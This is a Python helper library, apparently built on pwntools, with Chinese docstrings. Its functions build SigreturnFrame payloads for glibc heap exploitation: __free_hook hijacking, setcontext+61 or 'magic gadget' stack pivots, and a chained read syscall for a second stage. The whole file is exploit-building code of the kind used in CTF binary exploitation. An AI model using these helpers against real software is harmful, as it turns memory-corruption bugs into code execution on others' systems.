from typing import Optional
from pwnlib.rop.srop import SigreturnFrame

def heap_srop(sig: SigreturnFrame,
              chunk_content_addr: int,
              setcontext_61: int,
              *,
              use_magic: bool = True,
              is_free_chunk: bool = False,
              free_chunk_func: Optional[int] = None) -> SigreturnFrame:
    """
    创建一个 SigreturnFrame，用于在堆上布置 SROP。
    可以在 free chunk 上布置 SROP，也可以在非 free chunk 上布置 SROP。
    支持 magic gadget(2.31+) 和非 magic gadget(2.27)。
    - Magic gadget use case:
        - not free chunk:
            new(free_hook_idx, content=magic_gadget)  # __free_hook
            new(chunk_idx, content=heap_srop(...))
            free(chunk_idx)
        
        - free chunk:
            new(chunk_idx, content=heap_srop(..., is_free_chunk=True, free_chunk_func=magic_gadget))  # __free_hook
            free(__free_hook)

    - No magic gadget use case:
        - not free chunk:
            new(free_hook_idx, content=setcontext_61)  # __free_hook
            new(chunk_idx, content=heap_srop(..., use_magic=False))
            free(chunk_idx)
        - free chunk:
            new(chunk_idx, content=heap_srop(..., use_magic=False, is_free_chunk=True, free_chunk_func=setcontext_61))  # __free_hook
            free(__free_hook)

    :param sig: SigreturnFrame
    :param chunk_content_addr: chunk 的内容指针
    :param setcontext_61: setcontext + 61
    :param use_magic: 是否使用 magic gadget
    :param is_free_chunk: 是否是 __free_hook 对应的 chunk
    :param free_chunk_func: __free_hook 内容（在 is_free_chunk 为 True 时指定）
    :return: 生成好的 SigreturnFrame
    use_magic:    mov rdx, qword ptr [rdi+8];
                  mov [rsp], rax;
                  call qword ptr [rdx+0x20];
    """
    if use_magic:
        sig['&uc'] = chunk_content_addr  # rdi + 8 | rdx
        sig['uc_stack.ss_size'] = setcontext_61  # rdx + 0x20
    if is_free_chunk and free_chunk_func:
        sig['uc_flags'] = free_chunk_func
    sig['rsp'] = chunk_content_addr + 0xf8 if not sig['rsp'] else sig['rsp']
    return sig


def fast_read_srop(write_addr: int,
                   read_addr: Optional[int] = 0,
                   *,
                   syscall_addr: Optional[int] = 0) -> SigreturnFrame:
    """
    快速生成 READ 的 SROP，即 read(0, write_addr, 0x2000)

    :param write_addr: READ 到的地址
    :param read_addr: READ 函数的地址
    :param syscall_addr: syscall 的地址(二者必须指定一个，优先使用 read_addr)
    :return: 生成好的 SigreturnFrame
    """
    assert read_addr or syscall_addr, 'read_addr or syscall_addr must be specified'
    page = write_addr & ~0xfff
    sig = SigreturnFrame(kernel='amd64')
    sig.rsp = page + 0x800
    sig.rdi = 0
    sig.rsi = page + 0x800
    sig.rdx = 0x2000
    if read_addr:
        sig.rip = read_addr
    else:
        sig.rax = 0
        sig.rip = syscall_addr
    return sig


def FAST_HEAP_SROP(chunk_content_addr: int,
                   setcontext_61: int,
                   read_addr: Optional[int] = 0,
                   *,
                   use_magic: bool = True,
                   is_free_chunk: bool = False,
                   free_chunk_func: Optional[int] = None,
                   write_addr: Optional[int] = 0,
                   syscall_addr: Optional[int] = 0,
                   **kwargs) -> SigreturnFrame:
    """
    一键生成 fast_read_srop + heap_srop 的组合，用于在堆上一键布置 READ 的 SROP
    :param chunk_content_addr: chunk 的内容指针
    :param setcontext_61: setcontext + 61
    :param read_addr: READ 函数的地址
    :param use_magic: 是否使用 magic gadget
    :param is_free_chunk: 是否是 __free_hook 对应的 chunk
    :param free_chunk_func: __free_hook 内容（在 is_free_chunk 为 True 时指定）
    :param write_addr: READ 到的地址
    :param syscall_addr: syscall 的地址(二者必须指定一个，优先使用 read_addr)
    :param kwargs: 传递给 fast_read_srop 生成的 SigreturnFrame 的参数
    :return: 生成好的 SigreturnFrame
    """
    if not write_addr:
        write_addr = chunk_content_addr
    sig = fast_read_srop(write_addr, read_addr, syscall_addr=syscall_addr)
    for k, v in kwargs.items():
        sig[k] = v
    return heap_srop(sig, chunk_content_addr, setcontext_61,
                     use_magic=use_magic, is_free_chunk=is_free_chunk, free_chunk_func=free_chunk_func)